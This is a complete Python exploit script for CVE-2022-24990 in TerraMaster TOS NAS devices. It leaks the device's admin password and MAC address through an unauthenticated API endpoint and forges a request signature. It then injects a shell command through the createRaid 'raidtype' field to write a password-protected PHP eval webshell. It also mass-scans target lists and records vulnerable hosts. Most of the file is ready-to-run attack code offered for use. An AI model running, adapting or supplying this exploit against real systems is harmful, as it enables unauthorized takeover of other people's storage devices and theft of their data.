#!/usr/bin/env python3
# -*- encoding: utf-8 -*-
"""
@File     :   CVE-2022-24990.py
@Time     :   2022/03/20 00:34:41
@Author   :   _0xf4n9x_
@Version  :   1.0
@Contact  :   fanq.xu@gmail.com
@Desc     :   TerraMaster TOS unauthenticated RCE via PHP Object Instantiation
@Reference:   https://octagon.net/blog/2022/03/07/cve-2022-24990-terrmaster-tos-unauthenticated-remote-command-execution-via-php-object-instantiation/
"""


from hashlib import md5
import random
import requests
import sys
import os
import time
import urllib3
import argparse
urllib3.disable_warnings()

proxy = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080',
}

def usage():
    print("Eg: \n    python3 CVE-2022-24990.py -u http://127.0.0.1")
    print("    python3 CVE-2022-24990.py -a httts://127.0.0.1")
    print("    python3 CVE-2022-24990.py -f urls.txt")

def timestamp():
    return int(round(time.time()))

def signature(last_3_mac):
    id = last_3_mac + str(timestamp())
    return md5(id.encode('utf-8')).hexdigest()

def random_str(number):
    return ''.join(random.sample('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', number))

def poc(baseurl):
    path = '/module/api.php?mobile/webNasIPS'
    url = baseurl + path
    headers = {"User-Agent": "TNAS"}
    try:
        res = requests.get(url, headers=headers, timeout=6, proxies=proxy, verify=False)
        if (res.status_code == 200) and ('webNasIPS successful' in res.text) and ('mac' in res.text):
            print("[+] " + baseurl + " is vulnerable!")
            data = {'pwd':'', 'mac':'', 'timestamp':'', 'signature':''}
            data['pwd'] = res.text.split('PWD:')[1].split('\\n')[0].strip()
            data['mac'] = res.text.split('mac\\":\\"')[1].split('\\"}')[0].strip()
            data['timestamp'] = str(timestamp())
            last_3_mac = data['mac'][-9:].replace(':','')
            data['signature'] = signature(last_3_mac)
            return data
        else:
            pass
    except:
        pass
    print("[-] " + baseurl + " is not vulnerable!")
    return None

def upload(baseurl):
    data = {}
    data = poc(baseurl)
    if data != None:
        path = '/module/api.php?mobile/createRaid'
        url = baseurl + path
        headers = {
            "User-Agent": "TNAS", "Content-Type": "application/x-www-form-urlencoded", "Authorization": data['pwd'], "Signature": data['signature'], "Timestamp": data['timestamp'], "Upgrade-Insecure-Requests": "1"}
        webshell_name = random_str(10) + '.php'
        webshell_pass = random_str(10)
        command = 'echo \'<?php @eval($_POST["' + webshell_pass + '"]);?>\'>' + webshell_name
        payload = {'raidtype': ';'+command, 'diskstring': 'XXXX'}
        try:
            res = requests.post(url, data=payload, headers=headers, timeout=10, proxies=proxy, verify=False)
            if (res.status_code == 200) and ('true' in res.text) and ('createRaid successful' in res.text):
                print("[+] URL: " + baseurl + '/module/api.php?mobile/createRaid')
                print("[+] PWD: " + data['pwd'])
                print("[+] MAC: " + data['mac'])
                print("[+] Timestamp: " + data['timestamp'])
                print("[+] Signature: " + data['signature'])
                print("[+] Webshell: " + baseurl + '/module/' + webshell_name)
                print("[+] Webshell Password: " + webshell_pass)
                return True
            else:
                print("[-] Upload failed!")
        except:
            pass
    return None

if __name__ == '__main__':
    parser = argparse.ArgumentParser(
        description="CVE-2022-24990 TerraMaster TOS unauthenticated RCE via PHP Object Instantiation")
    parser.add_argument('-u', '--url', type=str,
                        help="vulnerability verification for individual websites")
    parser.add_argument('-a', '--attack', type=str,
                        help="attack the target and upload a PHP webshell")
    parser.add_argument('-f', '--file', type=str,
                        help="perform vulnerability checks on multiple websites in a file, and the vulnerable websites will be output to the success.txt file")
    args = parser.parse_args()
    if len(sys.argv) == 3:
        if sys.argv[1] in ['-u', '--url']:
            data = {}
            data = poc(args.url)
            if data != None:
                print("[+] URL: " + args.url + '/module/api.php?mobile/webNasIPS')
                print("[+] PWD: " + data['pwd'])
                print("[+] MAC: " + data['mac'])
                print("[+] Timestamp: " + data['timestamp'])
                print("[+] Signature: " + data['signature'])

        elif sys.argv[1] in ['-a', '--attack']:
            upload(args.attack)
            
        elif sys.argv[1] in ['-f', '--file']:
            if os.path.isfile(args.file) == True:
                with open(args.file) as target:
                    hosts = []
                    hosts = target.read().splitlines()
                    for host in hosts:
                        if poc(host) != None:
                            with open("success.txt", "a+") as f:
                                f.write(host + "\n")
    else:
        parser.print_help()
        usage()